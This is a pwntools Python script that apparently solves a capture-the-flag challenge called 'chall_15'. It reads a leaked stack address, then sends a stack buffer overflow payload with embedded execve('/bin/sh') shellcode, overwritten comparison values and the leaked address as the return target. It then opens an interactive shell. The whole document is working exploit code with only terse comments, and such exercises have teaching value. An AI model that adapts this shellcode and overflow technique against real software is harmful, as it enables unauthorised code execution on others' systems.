from pwn import *
import re
'''
Chall_15
'''
context.arch="amd64"
binary = context.binary = ELF('./chall_15')
p =process(binary.path)

resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
leak_as_int = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
print(hex(leak_as_int))


# 296 = shellcode(32b) + padding(0x128-0x4 - len(shllcde)) + cmp1(4) + cmp2(4) + oldbp(b'junk')4 + leak (8)p64

#32 bytes of shellcode
shellcode =  b'\x90\x90\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
#print("Shellcode len: ", len(shellcode))

padding =  b'A'*( 280 - len(shellcode))  #10h - bp

payload = shellcode         #32 bytes of goodness
payload += padding
payload += p32(0xdeadd00d)  #CMP1 DWORD is 32bit - 4 bytes
payload += p32(0xb16b00b5)  #CMP1 DWORD is 32bit - 4 bytes
payload += b'junk'          #4 bytes padding old BP
payload += p64(leak_as_int) #Leak 8 bytes

print("\n",payload,"\n")
print("Payload len: ", len(payload))

p.sendline(payload)
p.interactive()
